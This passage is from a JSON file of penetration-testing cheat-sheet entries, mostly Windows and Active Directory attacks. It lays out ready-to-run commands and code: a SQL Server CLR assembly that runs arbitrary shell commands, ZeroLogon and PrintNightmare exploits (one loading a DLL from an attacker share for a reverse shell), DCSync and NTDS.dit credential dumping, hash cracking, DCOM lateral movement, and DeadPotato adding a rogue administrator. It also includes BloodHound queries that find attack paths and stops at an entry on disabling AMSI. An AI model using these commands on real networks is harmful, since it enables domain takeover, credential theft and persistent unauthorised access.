        "remote": true,
        "local": false
      },
      {
        "title": "Generate CLR Assembly",
        "codes": [
          {
            "lang": "csharp",
            "code": "using System;\nusing System.Data.SqlTypes;\nusing Microsoft.SqlServer.Server;\nusing System.Diagnostics;\n\npublic class StoredProcedures\n{\n    [Microsoft.SqlServer.Server.SqlProcedure]\n    public static void cmdExec(SqlString cmd)\n    {\n        Process proc = new Process();\n        proc.StartInfo.FileName = @\"C:\\Windows\\System32\\cmd.exe\";\n        proc.StartInfo.Arguments = string.Format(@\"/C {0}\", cmd);\n        proc.StartInfo.UseShellExecute = false;\n        proc.StartInfo.RedirectStandardOutput = true;\n        proc.Start();\n    }\n}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Load custom .NET assemblies for code execution. Bypasses some security controls.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "CVE Exploits",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [
      {
        "title": "CVE-2020-1472 (ZeroLogon)",
        "codes": [
          {
            "lang": "bash",
            "code": "python3 zerologon_tester.py <DC_Name> <DC_IP>\npython3 cve-2020-1472-exploit.py <DC_Name> <DC_IP>"
          },
          {
            "lang": "bash",
            "code": "secretsdump.py <Domain>/<DC_Name>\\$@<DC_IP> -hashes aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee -just-dc-ntlm"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Critical Netlogon vulnerability. Resets DC machine account password to empty. Allows full domain takeover.\n**Patched:** August 2020"
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "NT hash for empty password: aad3b435b51404eeaad3b435b51404ee\n**Important:** Restore original DC password after exploitation to avoid breaking domain."
          }
        ]
      },
      {
        "title": "CVE-2021-1675 / CVE-2021-34527 (PrintNightmare)",
        "codes": [
          {
            "lang": "bash",
            "code": "python3 CVE-2021-1675.py <Domain>/<User>:<Password>@<TargetIP> '\\\\<AttackerIP>\\share\\payload.dll'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Print Spooler RCE vulnerability. Achieves SYSTEM via malicious printer driver DLL.\n**Patched:** Mid-2021\n**Requires:** Target running Print Spooler, valid domain creds, attacker SMB share with malicious DLL."
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "Use msfvenom or custom DLL for reverse shell payload."
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "BloodHound",
    "title": "Cypher Queries (Neo4j Interface)",
    "tags": [
      "Active_Directory",
      "BloodHound",
      "Discovery",
      "Enumeration",
      "Windows"
    ],
    "steps": [
      {
        "title": "Owned Objects",
        "substeps": [
          {
            "title": "List All Owned Users",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH (m:User) WHERE m.owned=TRUE RETURN m"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "List All Owned Computers",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH (m:Computer) WHERE m.owned=TRUE RETURN m"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "List All Owned Groups",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH (m:Group) WHERE m.owned=TRUE RETURN m"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "List Groups of Owned Users",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH (m:User) WHERE m.owned=TRUE WITH m MATCH p=(m)-[:MemberOf*1..]->(n:Group) RETURN p"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "High Value Targets",
        "substeps": [
          {
            "title": "List High Value Targets",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH (m) WHERE m.highvalue=TRUE RETURN m"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "High Value Target Groups",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH p=(n:User)-[r:MemberOf*1..]->(m:Group {highvalue:true}) RETURN p"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Attack Paths",
        "substeps": [
          {
            "title": "Find Shortest Path to Domain Admin",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH p=shortestPath((n {owned:true})-[*1..]->(m:Group {name:\"DOMAIN ADMINS@<DOMAIN>\"})) RETURN p"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Find All Domain Admins",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH (n:Group) WHERE n.name =~ \"(?i).*DOMAIN ADMINS.*\" RETURN n"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Kerberos Attacks",
        "substeps": [
          {
            "title": "Find All Kerberoastable Users",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH (n:User) WHERE n.hasspn=true RETURN n"
              },
              {
                "lang": "cypher",
                "code": "MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Kerberoastable Users with Old Passwords",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH (u:User) WHERE u.hasspn=true AND u.pwdlastset < (datetime().epochseconds - (1825 * 86400)) AND NOT u.pwdlastset IN [-1.0, 0.0] RETURN u.name, u.pwdlastset order by u.pwdlastset"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Find all Kerberoastable Users with passwords last set less than 5 years ago."
              }
            ]
          },
          {
            "title": "Kerberoastable Users with Path to DA",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH (u:User {hasspn:true}) MATCH (g:Group) WHERE g.objectid ENDS WITH '-512' MATCH p = shortestPath( (u)-[*1..]->(g) ) RETURN p"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Kerberoastable Users in High Value Groups",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH (u:User)-[r:MemberOf*1..]->(g:Group) WHERE g.highvalue=true AND u.hasspn=true RETURN u"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Kerberoastable Users and AdminTo",
            "codes": [
              {
                "lang": "cypher",
                "code": "OPTIONAL MATCH (u1:User) WHERE u1.hasspn=true OPTIONAL MATCH (u1)-[r:AdminTo]->(c:Computer) RETURN u"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Find AS-REP Roastable Users",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH (u:User {dontreqpreauth:true}) RETURN u.name"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Delegation",
        "substeps": [
          {
            "title": "Find Computers with Unconstrained Delegation",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name"
              },
              {
                "lang": "cypher",
                "code": "MATCH (c:Computer {unconstraineddelegation:true}) return c"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Unconstrained Delegation (Non-DC)",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH (c1:Computer)-[:MemberOf*1..]->(g:Group) WHERE g.objectid ENDS WITH '-516' WITH COLLECT(c1.name) AS domainControllers MATCH (c2:Computer {unconstraineddelegation:true}) WHERE NOT c2.name IN domainControllers RETURN c2"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Find computers that allow unconstrained delegation that are not domain controllers."
              }
            ]
          },
          {
            "title": "Constrained Delegation",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH p=(u:User)-[:AllowedToDelegate]->(c:Computer) RETURN p"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Computers with Constrained Delegation Targets",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH (c:Computer) WHERE c.allowedtodelegate IS NOT NULL RETURN c"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Permissions and Rights",
        "substeps": [
          {
            "title": "Find Users with DCSync Rights",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH p=(n)-[:GetChanges|GetChangesAll|GenericAll|WriteDacl|Owns]->(d:Domain) RETURN p"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Groups That Can Reset Passwords",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH p=(m:Group)-[r:ForceChangePassword]->(n:User) RETURN p"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Warning: Heavy query."
              }
            ]
          },
          {
            "title": "Groups with Local Admin Rights",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH p=(m:Group)-[r:AdminTo]->(n:Computer) RETURN p"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Warning: Heavy query."
              }
            ]
          },
          {
            "title": "All Users with Local Admin Rights",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH p=(m:User)-[r:AdminTo]->(n:Computer) RETURN p"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "RDP Access",
        "substeps": [
          {
            "title": "Domain Users RDP Access",
            "codes": [
              {
                "lang": "cypher",
                "code": "match p=(g:Group)-[:CanRDP]->(c:Computer) where g.objectid ENDS WITH '-513' return p"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Groups with RDP Access",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH p=(m:Group)-[r:CanRDP]->(n:Computer) RETURN p"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Sessions",
        "substeps": [
          {
            "title": "Domain Admin Sessions",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH (n:User)-[:MemberOf]->(g:Group) WHERE g.objectid ENDS WITH '-512' MATCH p = (c:Computer)-[:HasSession]->(n) return p"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Find Active Sessions",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Computer Queries",
        "substeps": [
          {
            "title": "List All Computers",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH(m:Computer) RETURN m"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Computers with Unsupported OS",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH (H:Computer) WHERE H.operatingsystem =~ '.*(2000|2003|2008|xp|vista|7|me)*.' RETURN H"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Computers with MSSQL SPNs",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH (c:Computer) WHERE ANY (x IN c.serviceprincipalnames WHERE toUpper(x) CONTAINS 'MSSQL') RETURN c"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "User Queries",
        "substeps": [
          {
            "title": "List All Users",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH(m:User) RETURN m"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Users Logged In Within 90 Days",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH (u:User) WHERE u.lastlogon < (datetime().epochseconds - (90 * 86400)) and NOT u.lastlogon IN [-1.0, 0.0] RETURN u"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Passwords Set Within 90 Days",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH (u:User) WHERE u.pwdlastset < (datetime().epochseconds - (90 * 86400)) and NOT u.pwdlastset IN [-1.0, 0.0] RETURN u"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Users Never Logged On (Active Accounts)",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH (n:User) WHERE n.lastlogontimestamp=-1.0 AND n.enabled=TRUE RETURN n"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "GPO Queries",
        "substeps": [
          {
            "title": "View All GPOs",
            "codes": [
              {
                "lang": "cypher",
                "code": "Match (n:GPO) RETURN n"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Domain User GPO Permissions",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH p=(u:User)-[r:AllExtendedRights|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|GpLink*1..]->(g:GPO) RETURN p"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Find if any domain user has interesting permissions against a GPO. Warning: Heavy query."
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Group Queries",
        "substeps": [
          {
            "title": "Groups Containing Admin",
            "codes": [
              {
                "lang": "cypher",
                "code": "Match (n:Group) WHERE n.name CONTAINS 'ADMIN' RETURN n"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Groups with Users and Computers",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH (c:Computer)-[r:MemberOf*1..]->(groupsWithComps:Group) WITH groupsWithComps MATCH (u:User)-[r:MemberOf*1..]->(groupsWithComps) RETURN DISTINCT(groupsWithComps) as groupsWithCompsAndUsers"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Users in VPN Group",
            "codes": [
              {
                "lang": "cypher",
                "code": "Match p=(u:User)-[:MemberOf]->(g:Group) WHERE toUPPER (g.name) CONTAINS 'VPN' return p"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Unprivileged Users with AddMember Rights",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH (n:User {admincount:False}) MATCH p=allShortestPaths((n)-[r:AddMember*1..]->(m:Group)) RETURN p"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Cross-Domain Queries",
        "substeps": [
          {
            "title": "Object with Foreign Domain Rights",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH p=(n)-[r]->(m) WHERE NOT n.domain = m.domain RETURN p"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Sessions in Specific Domain",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH p=(m:Computer)-[r:HasSession]->(n:User {domain:{result}}) RETURN p"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Database Management",
        "substeps": [
          {
            "title": "Delete All Data",
            "codes": [
              {
                "lang": "cypher",
                "code": "match (a) -[r] -> () delete a, r\nmatch (a) delete a"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "Custom Queries",
        "url": "https://github.com/hausec/Bloodhound-Custom-Queries"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Access Neo4j directly at `http://localhost:7474` for custom queries. Or use **Hackles**: `python -m hackles -c query.cypher`",
        "variant": "info"
      }
    ]
  },
  {
    "category": "DEP Theory",
    "title": "Data Execution Prevention Theory",
    "tags": [
      "Binary_Exploitation",
      "Debugging",
      "Exploitation",
      "ROP",
      "WinDbg",
      "Windows"
    ],
    "steps": [
      {
        "title": "DEP Overview [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Hardware and software-enforced execution prevention:\n- **Hardware DEP (NX bit)**: CPU marks pages as non-executable\n- **Software DEP**: SafeSEH validation (not true execution prevention)\n- **Effect**: Shellcode on stack/heap causes access violation when executed",
            "variant": "info"
          }
        ]
      },
      {
        "title": "DEP Modes [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Windows DEP configuration options:\n- **OptIn**: DEP only for system processes and opted-in applications\n- **OptOut**: DEP for all processes except opted-out applications\n- **AlwaysOn**: DEP for all processes, no exceptions\n- **AlwaysOff**: DEP disabled (rare, requires boot flag)",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Check DEP Status",
        "codes": [
          {
            "lang": "bash",
            "code": "wmic OS Get DataExecutionPrevention_SupportPolicy"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Determine DEP configuration on system."
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "0=AlwaysOff, 1=AlwaysOn, 2=OptIn, 3=OptOut"
          }
        ]
      },
      {
        "title": "Check Process DEP Status",
        "codes": [
          {
            "lang": "text",
            "code": "0:000> !vprot esp               ; Check stack protection\n0:000> !address esp             ; Detailed memory info"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Verify if specific process has DEP enabled."
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "Look for PAGE_EXECUTE_READWRITE (DEP off) vs PAGE_READWRITE (DEP on)."
          }
        ]
      },
      {
        "title": "Check Module DEP Compatibility",
        "codes": [
          {
            "lang": "text",
            "code": "!mona modules                   ; Lists NXCompat status"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "See if module is compiled with DEP support."
          }
        ]
      },
      {
        "title": "Windows Defender Exploit Guard [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Enhanced exploit mitigations in Windows 10+:\n- **Arbitrary Code Guard (ACG)**: Prevents dynamic code generation\n- **Control Flow Guard (CFG)**: Validates indirect call targets\n- **Return Flow Guard (RFG)**: Protects return addresses (limited)",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Check Exploit Guard Settings",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-ProcessMitigation -Name <Process>\nGet-ProcessMitigation -System"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "View Exploit Guard configuration."
          }
        ]
      },
      {
        "title": "DEP Bypass Strategies [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Techniques to execute code with DEP enabled:\n- **ROP (Return Oriented Programming)**: Chain existing code gadgets\n- **VirtualAlloc**: Allocate executable memory, copy shellcode\n- **VirtualProtect**: Mark existing memory as executable\n- **WriteProcessMemory**: Write shellcode to executable region\n- **SetProcessDEPPolicy**: Disable DEP for process (older Windows)",
            "variant": "important"
          }
        ]
      },
      {
        "title": "ROP Overview [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "Traditional exploit:         ROP exploit:\n[padding]                    [padding]\n[shellcode addr]             [gadget1 addr]  ; pop eax; ret\n[shellcode...]               [value for eax]\n                             [gadget2 addr]  ; call eax"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Execute code by chaining return addresses to existing instructions."
          }
        ]
      },
      {
        "title": "Why ROP Works [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "DEP doesn't prevent executing existing code:\n- **Executable modules**: DLLs contain legitimate code\n- **Gadgets**: Short instruction sequences ending in RET\n- **Chaining**: RET pops next address, continues chain\n- **Result**: Arbitrary computation using existing code",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Microsoft DEP Documentation",
        "url": "https://learn.microsoft.com/en-us/windows/win32/memory/data-execution-prevention"
      }
    ],
    "foundational": true,
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "DEP prevents code execution from non-executable memory regions like stack and heap."
      }
    ]
  },
  {
    "category": "NetExec",
    "title": "Database Management",
    "tags": [
      "Active_Directory",
      "Discovery",
      "Enumeration",
      "NetExec",
      "Windows"
    ],
    "steps": [
      {
        "title": "Show Credentials Database",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb --show-creds"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "NetExec stores all discovered credentials in a local database.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Clear Credentials Database",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb --clear-creds"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Export Credentials",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb --export-creds creds.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Fileless Lateral Movement",
    "title": "DCOM Lateral Movement",
    "tags": [
      "Lateral_Movement",
      "Windows"
    ],
    "steps": [
      {
        "title": "MMC20.Application Method",
        "codes": [
          {
            "lang": "powershell",
            "code": "$com = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\", \"<Target>\"))\n$com.Document.ActiveView.ExecuteShellCommand(\"cmd.exe\", $null, \"/c <Command>\", \"7\")"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "ShellWindows Method",
        "codes": [
          {
            "lang": "powershell",
            "code": "$com = [activator]::CreateInstance([type]::GetTypeFromCLSID(\"9BA05972-F6A8-11CF-A442-00A0C90A8F39\", \"<Target>\"))\n$item = $com.Item()\n$item.Document.Application.ShellExecute(\"cmd.exe\", \"/c <Command>\", \"C:\\Windows\\System32\", $null, 0)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Excel.Application Method",
        "codes": [
          {
            "lang": "powershell",
            "code": "$com = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\", \"<Target>\"))\n$com.DisplayAlerts = $false\n$com.DDEInitiate(\"cmd\", \"/c <Command>\")"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Mimikatz",
    "title": "DCSync Attack",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Mimikatz",
      "Windows"
    ],
    "steps": [
      {
        "title": "DCSync Specific User",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # lsadump::dcsync /domain:<Domain> /user:<Username>"
          },
          {
            "lang": "bash",
            "code": "mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "DCSync krbtgt Account",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # lsadump::dcsync /domain:<Domain> /user:krbtgt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "krbtgt hash is needed for Golden Ticket attacks.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "DCSync All Users",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # lsadump::dcsync /domain:<Domain> /all /csv"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "This dumps the entire domain - very noisy and slow.",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "DCSync Computer Account",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # lsadump::dcsync /domain:<Domain> /user:<ComputerName>$"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Computer account hashes are needed for Silver Ticket attacks.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Requires Domain Admin, Domain Controller, or Replication permissions.",
        "variant": "warning"
      }
    ]
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "DCSync Attack",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [
      {
        "title": "DCSync with Secretsdump",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-secretsdump <Domain>/<User>:<Pass>@<DC_IP> -just-dc-ntlm\nimpacket-secretsdump <Domain>/<User>:<Pass>@<DC_IP> -just-dc-user Administrator\nimpacket-secretsdump -just-dc <Domain>/<User>:<Pass>@<DC_IP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "DCSync with Mimikatz",
        "codes": [
          {
            "lang": "bash",
            "code": "lsadump::dcsync /domain:<Domain> /user:Administrator\nlsadump::dcsync /domain:<Domain> /all /csv"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Dump NTDS.dit from DC",
        "codes": [
          {
            "lang": "bash",
            "code": "vssadmin create shadow /for=C:\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\Temp\\ntds.dit\nreg save HKLM\\SYSTEM C:\\Temp\\SYSTEM"
          },
          {
            "lang": "bash",
            "code": "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Crack DCSync Hash",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt --force"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Requires Replicating Directory Changes permissions (Domain Admin or delegated).\nReplicate domain credentials using Directory Replication Service."
      }
    ]
  },
  {
    "category": "Token Impersonation - Potato Attacks",
    "title": "DeadPotato",
    "tags": [
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Add New Admin User",
        "codes": [
          {
            "lang": "bash",
            "code": "DeadPotato.exe -newadmin <Username>:<Password>"
          },
          {
            "lang": "bash",
            "code": "DeadPotato.exe -newadmin hacker:Password123!"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Verify User Creation",
        "codes": [
          {
            "lang": "bash",
            "code": "net localgroup administrators"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Login with New User",
        "codes": [
          {
            "lang": "bash",
            "code": "# RDP\nxfreerdp3 /u:hacker /p:'Password123!' /v:<TargetIP>\n\n# Evil-WinRM\nevil-winrm -i <TargetIP> -u hacker -p 'Password123!'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Using PSCredential",
        "codes": [
          {
            "lang": "powershell",
            "code": "$securePassword = ConvertTo-SecureString \"Password123!\" -AsPlainText -Force\n$credential = New-Object System.Management.Automation.PSCredential(\"DOMAIN\\hacker\", $securePassword)\nStart-Process \"cmd.exe\" -Credential $credential"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Creates a new local administrator user. Useful when you want persistent access.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Token Impersonation - Potato Attacks",
    "title": "Defense Evasion",
    "tags": [
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Disable AMSI",
        "codes": [
          {
